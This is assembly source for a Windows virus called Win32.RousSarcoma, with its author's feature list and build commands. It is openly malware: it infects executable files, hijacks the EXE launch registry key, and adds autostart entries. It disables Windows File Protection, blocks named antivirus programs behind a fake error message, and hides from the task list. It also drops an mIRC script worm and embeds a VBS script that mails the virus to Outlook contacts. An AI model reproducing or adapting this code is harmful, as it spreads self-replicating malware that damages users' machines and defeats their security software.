
;
;
;      .--------------------------------.
;     |                                  |
;     | Win32.RousSarcoma by SnakeByte   |
;     |     SnakeByte@kryptocrew.de      |
;     |  www.kryptocrew.de/snakebyte     |
;     .__________________________________.
;
;
; This virus was created by the idea of coding a retro virus, which
; is able too fool with some AV's. I was not able to realize all my ideas,
; but I think it is some fun. This virus uses some tricks to make disinfection
; harder. I came to the idea of making a virus which is able to drop itself to
; the original EXE File, when I saw that most AV's do not detect the first
; generation of a lot of viruses. Therefore the one part of this virus stays
; undetected by heuristics. Generally this virus consits of 2 parts. The EXE File
; Part and the one which is executed with an infected file. It "hooks" the execution
; of every EXE File and does not execute it if it is an AV. If it is none, it gets
; infected and started. Before starting the file it also checks if there is an 
; mirc.ini in the same path. If there is one, it drops a mirc script worm. In Addition
; to this, the virus install itself in the registry to get started every time with windows.
; It searches the registry for more paths to infect files there. If it can't find more
; paths it drops a vbs script to send the worm around via Outlook.
;
; I am not good at writing so here is an overview of what
; the virus does :
;
;
;  Name :             Win32.RousSarcoma
;  Type :             PE-Appender by increasing last section
;  Worming :          Yes, mIRC Script and VBS Worm
;  Operating System : Win32
;  Author :           SnakeByte
;  Payload :          None, too boring to write one ;)  [ Got some other interesting stuff
;                         in mind i want to code as soon as possible ]
;  Virus Size :       8192 Bytes
;  Infection Mark :   A-AV
;  Encryption :       None
;  Autostart :        RunOnce & exefiles
;  Anti-Bait :        Does not infect files < 20000 Bytes
;  Anti-Debugging :   Yes, against SoftIce and Int 1h tracing
;  Anti-AV :          Yes, does not allow the execution of several AV's
;                     disables Win2k File Protection
;  Anti-User :        Hides itself in files & several different places,
;                     is not shown at ctrl-alt-del list
;  Runs at Level :    Ring-3, but still infects every EXE File on executing
;  Infects :          10 Files in the current directory,
;                     10 Files in every path stored in this registry Key :
;                      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
;                     Every EXE File which gets executed
;
;  How to compile ( TASM 5.0 ) :
;
;     tasm32 /z /ml /m3 RousSarc,,;
;     tlink32 -Tpe -c RousSarc,RousSarc,, import32.lib
;     pewrsec RousSarc.EXE
;
;     ( Make sure that the .EXE is uppercases !! )
;
; At the moment there are just 100 Bytes of Code i could add, with the file staying
; at 8192 Bytes. If I would add more, the file would grow to 12 KB. I decided to
; keep it small and leave stuff out like encryption or even poly. Maybe it could
; be optimized on several parts to make it fit with encryption to a 8 KB file,
; but I don't mind at the moment
;
;
;
; Thanks and greetz to :
;
;  Lord Arz :    Did you also finish your EXEFILES "hooking" something ? ;)
;  DukeCS :      Heh, when will KC be done ? *fg*
;  Matsad :      Sorry, for not coming, but i got no cash and need to see my girlfriend :P
;  Lethal Mind : Heh, where are you ? ;(
;  Ciatrix :     Nice that you carry on !
;  
;

; ***************************************************************************
; ------------------------[ Let's get ready to rumble ]----------------------
; ***************************************************************************

.586p
.model flat
jumps                      ; calculate Jumps
.radix 16                  ; Hexadecimal numbers

                           ; define some API's
extrn ExitProcess:PROC     ; Host for EXE-Part
extrn LoadLibraryA:PROC    ; nessesairy to get all other API's in the EXE-Part
extrn GetProcAddress:PROC  ; cause I don't want DLL not found error's

extrn MessageBoxA:PROC     ; for testing

.code
                           ; Some constants
 VirusSize  equ 8192d      ; Lenght of EXE-File
 ImageBase  equ 400000h    ; Imagebase of our TASM generated EXE-File

 CPart1     equ 600h
 Gap1       equ 0A00h

; ###########################################################################
; -------------------[ This is the first part of the virus ]-----------------
; ###########################################################################
Virus:
                           ; Here do we search for EXE-files and put the
                           ; entire PE-Virus EXE to the end !
                           ; we search for the needed api's with GetProcAdress
                           ; and LoadModuleHandle, so we will not get Problems
                           ; with missing DLL's or API's

 mov ebp, 'VA-A'           ; place a mark in ebp, to identify this part

 lea eax, KERNEL32         ; push name of kernel32.dll
 push eax
 call LoadLibraryA         ; save Handle
 mov dword ptr [K32Handle], eax
 test eax, eax             ; if we failed we stop here
 jz FirstGenHost

 lea esi, Kernel32Names    ; get all API's we need from kernel
 lea edi, XFindFirstFileA
 mov ebx, K32Handle
 push NumberOfKernel32APIS
 pop ecx
 call GetAPI3              ; the procedure is needed in both parts

 lea eax, advname          ; push name of advapi32.dll
 push eax
 call LoadLibraryA         ; save Handle
 mov dword ptr [ADVHandle], eax
 test eax, eax             ; if we failed we stop here
 jz FirstGenHost

 lea esi, AdvapiNames      ; get all API's we need from kernel
 lea edi, XRegOpenKeyExA
 mov ebx, ADVHandle
 push NumberOfAdvapiAPIS
 pop ecx
 call GetAPI3              ; the procedure is needed in both parts

                           ; Lets hide our Application from the CTRL-ALT-DEL List,
                           ; to prevent us from being detected by a suspicious user ;)

                           ; Check if the API is available
 cmp dword ptr [XRegisterServiceProcess],0 
 je NoHide

                           ; Get ID of our process
 call dword ptr [XGetCurrentProcessId]

 push   1                  ; We want to run as a service
 push   eax                ; process id
 call dword ptr [XRegisterServiceProcess]

NoHide:

; ***************************************************************************
; ---------------------------[ Initialisation ]------------------------------
; ***************************************************************************
                           ; Lets do a check on our commandline params,
                           ; to see, if we got startet with a filename
                           ; in it --> exefile method

 call dword ptr [XGetCommandLineA]
 mov dword ptr [CmdLine], eax

                           ; the start of the commandline is in eax,
                           ; we will parse it to the .exe part to see
                           ; if there is anything afterwards
CommandReceive1:
 cmp dword ptr [eax],'EXE.'
 je CommandOK1
 inc eax
 jmp CommandReceive1


CommandOK1:  
 add eax, 4h               ; eax points directly after the <name>.exe
 cmp byte ptr [eax], 0     ; if the Commandline ends here, we do not need
 je SetRunOnceKey          ; to care about this ;)

 add eax, 2h               ; skip blanc and "
 mov esi, eax              ; save it
 mov dword ptr [SaveBlanc], esi

 push esi
 call AVNameCheck
 cmp esi, 0
 je AVMessage
 pop esi
 jmp mIRCcheck


AVMessage:                 ; Arg ! Dirty AV found .. :P
 pop esi                   ; lets drop a message

 push 30h                  ; Style
 push esi
 push offset AVMsg
 push 0
 call MessageBoxA
 jmp SetRunOnceKey

 AVMsg db "File is corrupted. Can't start program",0

 PathEnd dd 0h

mIRCcheck:                 ; we search for the path
 pushad

 push offset PathEnd
 push offset NameBuffer
 push 255d
 push dword ptr [SaveBlanc]
 call dword ptr [XGetFullPathNameA]
 
 mov edi, dword ptr [PathEnd]
 mov esi, offset mircINI  ; append the mirc.ini to the path
 mov ecx, 9d
 rep movsb                ; and now we need to check if the mIRC.ini does exist
                          ; if it does, we found a mirc script to infect *eg*
                          ; because we infect it bevore mIRC gets loaded, we do not
                          ; need to fear the mIRC worm protection
 lea esi, NameBuffer
 call FindFirstFileProc
 cmp eax, -1              ; we did not found the mirc.ini ;(
 je NoMirc

 push offset NameBuffer   ; Write our entry to the file
 push offset MIRCprot
 push offset MOffset
 push offset MIRCrfiles    
 call dword ptr [XWritePrivateProfileStringA]

 mov edi, dword ptr [PathEnd]
 mov esi, offset MIRCprot ; append the RousSarc.ini to the path
 mov ecx, 13d
 rep movsb                ; and now we need to check if the mIRC.ini does exist

 push 0
 push 080h                ; normal attribs
 push 2h                  ; create a new file (always)
 push 0
 push 0
 push 0C0000000h          ; read + write
 lea eax, NameBuffer      ; file we create
 push eax
 Call dword ptr [XCreateFileA]
 cmp eax, 0FFFFFFFFh
 je NoMirc

 push eax                 ; save filehandle

 push 0                   ; write script to file
 push offset Write
 push offset EndScript - offset MIRCscript
 push offset MIRCscript
 push Handle
 call dword ptr [XWriteFile]


                          ; Handle is still on the stack, so we close the file
 call dword ptr [XCloseHandle]
 
NoMirc:
                          ; close the search handle
 push dword ptr [FindHandle]
 call dword ptr [XCloseHandle]
 popad

CommandReceive2:           ; so we will be able to locate the file and
 cmp byte ptr [eax],'.'    ; infect it
 je CommandOK2
 cmp byte ptr [eax],0      ; check if we don't get too far
 je Outbreak
 inc eax
 jmp CommandReceive2
CommandOK2:  
 add eax, 4h
 cmp byte ptr [eax],0
 jne ZeroAfterName
 mov byte ptr [eax+1],0
ZeroAfterName:
 mov byte ptr [eax],0      ; we place a Zero here, so we can do a findfirst
                           ; on the filename which is in esi

 push eax
 push esi
 call FindFirstFileProc
 pop esi                   ; esi points to start of filename
 pop ebx                   ; ebx points to the parameters

 cmp eax, -1               ; file is not there :( 
 je Outbreak               ; we infect some others


 pushad                    ; save registers
 lea edi, WFD_szFileName
 mov ecx, ebx              ; lenght of filename in ecx
 sub ecx, esi
 inc ecx
 rep movsb                 ; write filename & path there

 lea esi, WFD_szFileName   ; point to filename
 call InfectFile           ; infect file
 popad                     ; restore registers

                           ; esi points to start of filename
                           ; ebx points to the parameters
 mov byte ptr [ebx], " "   ; place a blank here

 xor eax, eax              ; let's execute the file
 push offset ProcessInformation 
 push offset StartupInfo
 push eax                  ; lpCurrentDirectory
 push eax                  ; lpEnvironment  
 push eax                  ; Create_New_Process_Group & Normal_Priority_Class
 push eax                  ; bInheritHandles
 push eax                  ; lpThreadAttributes
 push eax                  ; lpProcessAttributes
 push esi                  ; filename with commandline
 push eax                  ; command line
 call dword ptr [XCreateProcessA]


SetRunOnceKey:             ; Here we go if we found an AV or got
                           ; or after executing a program
                           ; lets add 2 autostart features

                           ; Now we store the name of this file in the RunOnce key
                           ; ( we add our file that regulary, that it will be always there,
                           ; but nearly noone looks for files in this key *g* )
 push offset RegHandle
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset RunOnceKey    ; check if our key exists
 push HKEY_LOCAL_MACHINE   ; HKEY_LOCAL_MACHINE
 call dword ptr [XRegOpenKeyExA]

 cmp eax, 0
 jne CheckOwnKey 

 xor eax, eax              ; search for end of Systemdirectory
 lea edi, NameBuffer
 mov ebx, edi 
 repnz scasb
 sub ebx, edi
 inc ebx
 
 push ebx
 push offset NameBuffer    ; Value
 push 1h                   ; String
 push 0                    ; reserved
 push offset Valuename     ; value name
 push dword ptr [RegHandle]
 call dword ptr [XRegSetValueExA]

 push dword ptr [RegHandle]
 call dword ptr [XRegCloseKey]


jmp FirstGenHost

SaveBlanc     dd 0h
EXEFilesKey   db 'exefile\shell\open\command',0
EXEFilesValue db 'RousSarc.EXE "%1" %*',0
EFVSize       equ $ - offset EXEFilesValue

; ***************************************************************************
; ------------------------------[ Outbreak ! ]-------------------------------
; ***************************************************************************
Outbreak:                  ; We got no commandline !
 HKEY_CURRENT_USER equ 80000001h
 HKEY_LOCAL_MACHINE equ 80000002h
                           ; first of all, let's disable the win2k virus protection

 push offset RegHandle
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset _2kProt       ; check if our key exists
 push HKEY_LOCAL_MACHINE   ; HKEY_LOCAL_MACHINE
 call dword ptr [XRegOpenKeyExA]

 test eax, eax             ; if we failed opening the key, we return
 jz No2kProt

                           ; Value to disable Windows File Protection
 mov dword ptr [RegBuffer], 0ffffff9dh

 push 4
 push offset RegBuffer     ; Value
 push 4h                   ; REG_DWORD
 push 0                    ; reserved
 push offset _2kProtValue  ; value name
 push dword ptr [RegHandle]
 call dword ptr [XRegSetValueExA]

                           ; Close it again
 push dword ptr [RegHandle]
 call dword ptr [XRegCloseKey]

No2kProt:                  ; Now we will copy ourselfes into the windows directory
                           ; to be able to respond to every started file
                           ; we just got the cmd line
 mov eax, dword ptr [CmdLine]
CommandReceive3:
 cmp dword ptr [eax],'EXE.'
 je CommandOK3
 inc eax
 jmp CommandReceive3


CommandOK3:  
 add eax, 4h               ; eax points directly after the <name>.exe
 mov byte ptr [eax], 0     ; Place a 0 here to copy the file

 push 255d
 push offset NameBuffer
 call dword ptr [XGetWindowsDirectoryA]

 xor eax, eax              ; search for end of Systemdirectory
 lea edi, NameBuffer
 repnz scasb
 dec edi
 lea esi, RunOnceName      ; Append Filename
 mov ecx, 13d
 rep movsb
     
                    ; Copy our file to the system directory
 push 1
 push offset NameBuffer    ; where to store
 push dword ptr [CmdLine]  ; existing
 call dword ptr [XCopyFileA]  

                           ; Lets set the Exefiles Key
 push offset RegHandle
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset EXEFilesKey   ; Open It
 push 80000000h            ; HKEY_CLASSES_ROOT
 call dword ptr [XRegOpenKeyExA]

 cmp eax, 0
 jne CheckOwnKey

                           ; Let's set our Value
 push EFVSize
 push offset EXEFilesValue ; Value
 push 1h                   ; String
 push 0h                   ; reserved
 push 0h                   ; value name
 push dword ptr [RegHandle]
 call dword ptr [XRegSetValueExA]
 

 push dword ptr [RegHandle]
 call dword ptr [XRegCloseKey]
 
 
CheckOwnKey:
 mov dword ptr [RegBuffer], 0h

 push offset RegHandle
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset MyKey         ; check if our key exists
 push HKEY_CURRENT_USER    ; HKEY_CURRENT_USER
 call dword ptr [XRegOpenKeyExA]

 test eax, eax             ; if we failed opening the key, we return
 jz KeySet

 xor eax, eax              ; clear eax
 push offset Dispostiton
 push offset RegHandle
 push eax                  ; security attribs
 push 001F0000h            ; complete access
 push eax                  ; REG_OPTION_NON_VOLATILE
 push eax                  ; lpClass
 push eax                  ; reserved
 push offset MyKey         ; Subkey
 push HKEY_CURRENT_USER    ; HKEY_CURRENT_USER    
 call dword ptr [XRegCreateKeyExA]

KeySet:
 
 push offset RegData2
 push offset RegBuffer
 push offset RegData1
 push 0
 push offset Valuename
 push dword ptr [RegHandle]
 call dword ptr [XRegQueryValueExA]
                           ; RegBuffer contains now a value after which
                           ; we decide what to do, but first, we increment the
                           ; value and save it
 inc dword ptr [RegBuffer] ; Increment Value

 push 4
 push offset RegBuffer     ; Value
 push 4h                   ; REG_DWORD
 push 0                    ; reserved
 push offset Valuename     ; value name
 push dword ptr [RegHandle]
 call dword ptr [XRegSetValueExA]

                           ; Close the key
 push dword ptr [RegHandle]
 call dword ptr [XRegCloseKey]

 mov eax, dword ptr [RegBuffer]

; Now we decide what to do ( we start with 2 because we just incremented it and i will not do anything after
;                            the second start, cause we need one reboot to disable WFP ) :
;
;           Value     - what to do
;
;             2       - infect directory 1 of
;                       HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
;             3       - "         "      2 "    ""
;             4       - "         "      3 "    ""
;             5       - "         "      4 "    ""
;             6       - "         "      5 "    ""
;             ... no more directorys in RegKey ?  --> set value to 0


dec eax
dec eax

jz NoRegistryInfection
 push eax

 push offset RegHandle
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset AppPaths      ; App Paths are stored here
 push HKEY_LOCAL_MACHINE   ; HKEY_LOCAL_MACHINE
 call dword ptr [XRegOpenKeyExA]

 pop eax

 push 255d
 push offset NameBuffer 
 push eax                  ; Key Number we want to retrieve
 push dword ptr [RegHandle] 
 call dword ptr [XRegEnumKeyA]
 cmp eax, 0
 jne DropVBSWorm

 push offset RegHandle2
 push 001F0000h            ; complete access
 push 0h                   ; reserved
 push offset NameBuffer    ; App Paths are stored here
 push dword ptr [RegHandle] ; HKEY_LOCAL_MACHINE
 call dword ptr [XRegOpenKeyExA]

                           ; Read Vakze

 mov dword ptr [RegData2], 255d

 push offset RegData2
 push offset NameBuffer
 push offset RegData1
 push 0
 push offset PathValue
 push dword ptr [RegHandle2]
 call dword ptr [XRegQueryValueExA]

 push dword ptr [RegHandle2]
 call dword ptr [XRegCloseKey]

 lea edi, NameBuffer        ; Remove ; to get directory
 mov al, ';'
 mov ecx, 254d
 repnz scasb
 dec edi
 mov byte ptr [edi], 0

 push offset CurrentPath              ; Get Current dir and save it
 push 255d
 call dword ptr [XGetCurrentDirectoryA]

 push offset NameBuffer               ; set new directory
 call dword ptr [XSetCurrentDirectoryA]

 call InfectCurDir                    ; Infect the directory

 push offset CurrentPath              ; restore old directory
 call dword ptr [XSetCurrentDirectoryA]

CloseRegInfection:
 push dword ptr [RegHandle]
 call dword ptr [XRegCloseKey]


NoRegistryInfection:

 call InfectCurDir         ; Infect the current directory
 jmp FirstGenHost


DropVBSWorm:               ; Ok, we found no more directorys in the App Paths
                           ; Registry Key, so we will drop a little VBS Script
                           ; and execute it, so the virus will also spread with
                           ; the help of outlook
 push 0
 push 080h                ; normal attribs
 push 2h                  ; create a new file (always)
 push 0
 push 0
 push 0C0000000h          ; read + write
 lea eax, VBSWorm
 push eax
 Call dword ptr [XCreateFileA]
 cmp eax, 0FFFFFFFFh
 je CloseRegInfection

 push eax                 ; save filehandle

 push 0                   ; write script to file
 push offset Write
 push offset EndVBSScript - offset VBSscript
 push offset VBSscript
 push Handle
 call dword ptr [XWriteFile]


                          ; Handle is still on the stack, so we close the file
 call dword ptr [XCloseHandle]

 xor eax, eax              ; let's execute the wormy script
 push offset ProcessInformation 
 push offset StartupInfo
 push eax                  ; lpCurrentDirectory
 push eax                  ; lpEnvironment  
 push eax                  ; Create_New_Process_Group & Normal_Priority_Class
 push eax                  ; bInheritHandles
 push eax                  ; lpThreadAttributes
 push eax                  ; lpProcessAttributes
 push offset VBSWorm       ; filename with commandline
 push eax                  ; command line
 call dword ptr [XCreateProcessA]


 jmp CloseRegInfection

VBSscript:
 db 'On Error Resume Next', 13d, 10d
 db 'Dim R', 13d, 10d
 db 'Set RS=CreateObject("Outlook.Application")', 13d, 10d
 db 'For R=1 To 500', 13d, 10d
 db 'Set Mail=RS.CreateItem(0)', 13d, 10d
 db 'Mail.to=RS.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)', 13d, 10d
 db 'Mail.Subject="Funny Thing !"', 13d, 10d
 db 'Mail.Body="Take a look at this and just start laughing !"', 13d, 10d
 db 'Mail.Attachments.Add("C:\RousSarc.EXE")', 13d, 10d
 db 'Mail.Send', 13d, 10d
 db 'Next', 13d, 10d
 db 'RS.Quit', 13d, 10d, 13d, 10d
EndVBSScript:
 
 VBSWorm   db 'C:\RousSarc.vbs',0

 AppPaths  db 'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths',0
 PathValue db 'Path',0

 RegData2   dd 4h          ; Bytes to read in Buffer
 RegBuffer  dd 0h          ; Buffer
 Valuename  db 'RousSarcoma',0
 MyKey      db 'RousSarcoma',0
 RegHandle2 dd 0h
 



; ***************************************************************************
; --------------------------[ Infection current dir ]------------------------
; ***************************************************************************

                           ; We got all we need
                           ; let's party ;)
InfectCurDir:              ; Infect up to 10 files in the current directory
                           ; use FindFirstFile / Next to find files
                           ; 10 files at max.
 mov dword ptr [InfCounter], 10d


 lea esi, filemask
 call FindFirstFileProc

 inc eax
 jz EndInfectCurDir1       ; did we get all ?
 dec eax

InfectCurDirFile:
                           ; Filename in esi
 lea esi, WFD_szFileName
 call InfectFile           ; Try it !
 cmp dword ptr [InfCounter], 0h
 jna EndInfectCurDir2

 call FindNextFileProc

 test eax, eax
 jnz InfectCurDirFile
 
EndInfectCurDir2:          ; close Search - Handle

 push dword ptr [FindHandle]
 call dword ptr [XFindClose]

EndInfectCurDir1:

ret


; ***************************************************************************
; -------------------------[ prepare Infection  ]----------------------------
; ***************************************************************************

InfectFile:                ; filename is in WFD_szFileName
                           ; esi shows to this value

 call AVNameCheck
 cmp esi, 0h
 je NoInfection

 lea esi, WFD_szFileName
 
                           ; ignore files smaller than 20000 Bytes
 cmp dword ptr [WFD_nFileSizeLow], 20000d
 jbe NoInfection
                           ; ignore files bigger than 4,3 GB
 cmp dword ptr [WFD_nFileSizeHigh], 0
 jne NoInfection

 call OpenFile             ; Open File
 jc NoInfection            ; stop if there are problems
 mov esi, eax

 call CheckMZSign          ; Check for DOS-Stub
 jc Notagoodfile

 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile

 xor esi, esi              ; get PE-Header
 mov esi, [eax+3Ch]
                           ; Check if file is corrupted
 cmp dword ptr [WFD_nFileSizeLow], esi
 jb Notagoodfile

 add esi, eax
 mov edi, esi
 call CheckPESign          ; Check for PE-Header
 jc Notagoodfile
                           ; Check Infection Mark
                           ; --> A-AV ( Anti- Anti-Virus )

 cmp dword ptr [esi+4Ch], 'VA-A'
 jz Notagoodfile

 mov bx, word ptr [esi+16h]; Get Characteristics
 and bx, 0F000h            ; select Dll-Flag
 cmp bx, 02000h
 je Notagoodfile           ; we won't no DLL Files

 mov bx, word ptr [esi+16h]; Check for DLL-Files
 and bx, 00002h
 cmp bx, 00002h
 jne Notagoodfile         

 call InfectEXE            ; Infect this sucker !
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
 ret

; ***************************************************************************
; ------------------------------[ File-Handling ]----------------------------
; ***************************************************************************
                           ; FileName needs to be in esi
OpenFile:
 xor eax,eax               ; Open Files
 push eax
 push eax
 push 3h
 push eax
 inc eax
 push eax
 push 80000000h or 40000000h
 push esi                  ; Filename is in ESI
 call dword ptr [XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [FileHandle],eax
 mov ecx, dword ptr [WFD_nFileSizeLow]

CreateMap:
 push ecx
 xor eax,eax
 push eax
 push ecx
 push eax
 push 00000004h
 push eax
 push dword ptr [FileHandle]
 call dword ptr [XCreateFileMappingA]

 mov dword ptr [MapHandle],eax

 pop ecx                   ; Get Map-Site
 test eax, eax
 jz CloseFile              ; Datei wieder...

 xor eax,eax
 push ecx
 push eax
 push eax
 push 2h
 push dword ptr [MapHandle]
 call dword ptr [XMapViewOfFile]

 or eax,eax
 jz UnMapFile
                           ; EAX contains starting offset of the map
 mov dword ptr [MapAddress],eax
 clc
 ret

UnMapFile:
 call UnMapFile2

CloseFile:
 push dword ptr [FileHandle]
 call [XCloseHandle]

Closed:
 stc
 ret

UnMapFile2:
 push dword ptr [MapAddress]
 call dword ptr [XUnmapViewOfFile]

 push dword ptr [MapHandle]
 call dword ptr [XCloseHandle]

 ret

  
; ***************************************************************************
; ---------------------[ Infection of the EXE-File ]-------------------------
; ***************************************************************************

InfectEXE:                 ; MapAddress contains the start address of the file

 mov ecx, [esi+3Ch]        ; esi points to PE-Header
                           ; ecx = Alignment Faktor
 mov eax, dword ptr [WFD_nFileSizeLow] 
 add eax, VirusSize
 
 call Align
 mov dword ptr [NewSize], eax
 xchg ecx, eax

 pushad
 call UnMapFile2           ; remap file
 popad

 call CreateMap
 jc NoEXE
                           ; esi = PE-Header
 mov esi, dword ptr [eax+3Ch]

 add esi, eax
 mov edi, esi              ; edi = esi
                           ; eax = Sections
                           ; get last section
 movzx eax, word ptr [edi+06h]
 dec eax
 imul eax, eax, 28h
 add esi, eax
 add esi, 78h              ; point to Directory Table

 mov edx, [edi+74h]        ; Get Directory Entrys
 shl edx, 3h
 add esi, edx
                           ; get EIP
 mov eax, [edi+28h]
 mov dword ptr [OldEIP], eax

                           ; get Imagebase
 mov eax, [edi+34h]
 mov dword ptr [OldBase], eax

 mov edx, [esi+10h]        ; get size of RAW-Data
 mov ebx, edx
 add edx, [esi+14h]        ; edx = points to raw-data
 push edx

 mov eax, ebx
 add eax, [esi+0Ch]        ; EAX contains now Start of our file
                           ; but we need to point it to the second part of the virus
 add eax, ( offset SecondPart - ImageBase ) - Gap1
                           ; the 0A00h are caused by the uninitialized data

 mov [edi+28h], eax
 mov dword ptr [NewEIP], eax

 mov eax, [esi+10h]        ; enlarge Raw-Data
 push eax
 add eax, VirusSize        ; VirusSize = Size of entire file
 mov ecx, [edi+3Ch]        ; align it
 call Align

 mov [esi+10h], eax        ; save in file

 pop eax                   ; new Virtual-Size
 add eax, VirusSize
 mov [esi+08h], eax

 pop edx

 mov eax, [esi+10h]
 add eax, [esi+0Ch]        ; get new imagesize
 mov [edi+50h], eax
                           ; change the section flags
 or dword ptr [esi+24h], 0A0000020h
                           ; Write infection mark to file
                           ; --> A-AV ( Anti- Anti-Virus )
 mov dword ptr [edi+4Ch], 'VA-A'

 xchg edi, edx

                           ; save the start of the virus in file
 mov dword ptr [StartofVirusinFile], edi
 add edi, dword ptr [MapAddress]
 push edi

 call OpenMyself
                           ; lets save the right Imagebase and EIP
                           ; inside our buffered file ;)

                           ; Save EIP & Imagebase 
 mov eax, dword ptr [OldEIP]
 lea edi, FileBuffer
 add edi, (offset retEIP - ImageBase) - Gap1
 stosd

 mov eax, dword ptr [OldBase]
 lea edi, FileBuffer
 add edi, (offset retBas - ImageBase) - Gap1 
 stosd

 pop edi
 lea esi, FileBuffer 
 mov ecx, VirusSize        ; First Part
 rep movsb                 ; append
                           ; we need two steps, otherwise we would fill the

 dec byte ptr [InfCounter]
 clc
ret


NoEXE:
 stc
ret

; ***************************************************************************
; -------------------------[ Open Us-Prozedur ]------------------------------
; ***************************************************************************
OpenMyself:                ; this Procedure returns the start of
                           ; the current file in esi 
                           ; first we need the filename
 pushad
 call dword ptr [XGetCommandLineA]
 inc eax
 mov dword ptr [CmdLine], eax

CommandReceive:
 cmp dword ptr [eax],'EXE.'
 je CommandOK
 inc eax
 jmp CommandReceive

CommandOK:  
 add eax, 4h
 mov byte ptr [eax],0     ; CmdLine contains now a pointer 
                          ; to the filename of our file
 mov esi, dword ptr [CmdLine]

 xor eax,eax              ; Open File
 push eax
 push eax
 push 3h
 push eax
 inc eax
 push eax
 push 80000000h
 push esi                 ; Filename is in ESI
 call dword ptr [XCreateFileA]
 
 mov ebx, eax              ; save handle

 push 0                    ; load the file into the free memory
 push offset Read          ; number of bytes read..
 push VirusSize            ; read how many bytes ?
 push offset FileBuffer
 push eax
 call dword ptr [XReadFile]

 push ebx
 call dword ptr [XCloseHandle]
 popad
ret
 
 Read dd ?

; ***************************************************************************
; -----------------------[ Check if we got an AV ]---------------------------
; ***************************************************************************
AVNameCheck:               ; pointer to name is in esi
pushad                     ; save all registers

lea edi, NameBuffer        ; we transfer the name to a buffer
xor ecx, ecx

NameCheckLoop:
 cmp byte ptr [esi], 0     ; check if we are at the end
 je NameTransferred
 lodsb                     ; get first letter
 cmp al, 96d
 jb StoreLetter
 sub al, 32d               ; convert to uppercase
 
StoreLetter:
 stosb
 inc ecx
 jmp NameCheckLoop

NameTransferred:           ; nothing found .. :(
 cmp ecx, 0
 je EndNameCheck
 mov dword ptr [NameLen], ecx

 mov edx, 28d              ; Number of AV-Names we check
 lea esi, AVNames          ; Pointer to the names
 lea ebp, AVLenght
CheckLoop:
 call NameCheck            ; Procedure to check this name
 jc WeGotAvName            ; if Carriage Flag is set we got one
 dec edx                   ; otherwise we search on, until edx = 0
 jz EndNameCheck

 xor eax, eax
 mov al, byte ptr [ebp]    ; increase esi
 mov esi, dword ptr [NameESI2]
 add esi, eax
 inc ebp
 jmp CheckLoop

EndNameCheck:              ; We found nothing :)
popad
ret

WeGotAvName:               ; We found a dirty AV :(
 popad
 xor esi, esi              ; ESI = 0 as flag
 ret

NameCheck:                 ; ECX contains the size of the search area
                           ; ESI points to av name
                           ; EDI points to filename
 mov dword ptr [NameESI2], esi
 mov ecx, dword ptr [NameLen]
 lea edi, NameBuffer       ; here we search for the Name
 mov al, byte ptr [esi]    ; get first byte into al..

 mov dword ptr [NameESI], esi   ; avname
 mov dword ptr [NameEDI], edi   ; filename

SearchOn:
 mov esi, dword ptr [NameESI]   ; avname
 mov edi, dword ptr [NameEDI]

 repnz scasb               ; start search
 cmp ecx,0
 jz NoAV

 mov dword ptr [NameESI], esi
 dec edi
 mov dword ptr [NameEDI], edi

Compare:                  ; compare the rest of the string
  xor ecx, ecx
  mov cl, byte ptr [ebp]  ; points to stringlenght
Compare2:
  repz cmpsb
  jc Compare2
  cmp ecx,0
  jz Found

NoAV:
 ret

Found:                     ; We got a dirty AV :P
  stc                      ; set flag
  ret

 NameLen  dd 0h            ; Size of the filename
 NameESI  dd 0h            ; Pointer to av name
 NameEDI  dd 0h            ; Pointer to filename
 NameESI2 dd 0h            ; Pointer to av name

                           ; Table with names of AV-File we don't start
AVNames:
 db 'AVPM'                 ; AVP Names
 db 'AVP32'
 db 'AVPCC'
 db 'AVPTC'
 db '_AVPM'
 db '_AVP32'
 db '_AVPCC'
 db 'AVPDOS'

 db 'AVE32'                ; Anti-Vir
 db 'AVGCTRL'
 db 'AVWIN95'

 db 'SCAN32'               ; DR-Solomon
 db 'AVCONSOL'
 db 'VSHWIN32'

 db 'FP-WIN'               ; F-Prot
 db 'F-STOPW'

 db 'DVP95'                ; F-Secure
 db 'F-AGNT95'
 db 'F-PROT95'

 db 'VET95'                ; InnoculateIT
 db 'VETTRAY'

 db 'CLAW95'               ; Norman Virus Control
 db 'NVC95'

 db 'NAVAPW32'             ; Norton
 db 'NAVW32'

 db 'SWEEP95'              ; Sophos

 db 'IOMON98'              ; PC-Cillin
 db 'PCCWIN98'

 db 'MONITOR'              ; RAV
 db 'RAW7WIN'

AVLenght:
 db 4d, 5d, 5d, 5d, 5d, 6d, 6d, 6d   ; AVP
 db 5d, 7d, 7d             ; ANTI-Vir
 db 6d, 8d, 8d             ; DR-Solomon
 db 6d, 7d                 ; F-PROT
 db 5d, 8d, 8d             ; F-Secure
 db 5d, 7d                 ; Innoculate-IT
 db 6d, 5d                 ; Norman
 db 8d, 6d                 ; Norton
 db 7d                     ; Sophos
 db 7d, 8d                 ; PC-Cillin
 db 7d, 7d                 ; RAV

; ***************************************************************************
; --------------------------[ Align-Prozedur ]-------------------------------
; ***************************************************************************
                           ; eax - Size
                           ; ecx - base
Align:
 push edx
 xor edx, edx
 push eax
 div ecx
 pop eax
 sub ecx, edx
 add eax, ecx
 pop edx                   ; eax - New Size
ret


; ***************************************************************************
; --------------------------[ FindFile Prozeduren ]--------------------------
; ***************************************************************************

                           ; Search for files
FindFirstFileProc:
 call ClearFindData
 lea eax, WIN32_FIND_DATA
 push eax
 push esi
 call dword ptr [XFindFirstFileA]
 mov dword ptr [FindHandle], eax
ret

FindNextFileProc:
 call ClearFindData 
 lea eax, WIN32_FIND_DATA
 push eax
 mov eax, dword ptr [FindHandle]
 push eax
 call dword ptr [XFindNextFileA]
ret

ClearFindData:
 lea edi, WFD_szFileName
 mov ecx, 276d             ; clear old data
 xor eax, eax
 rep stosb
ret

;****************************************************************************
;-----------------------------[ PE / MZ Check ]------------------------------
;****************************************************************************
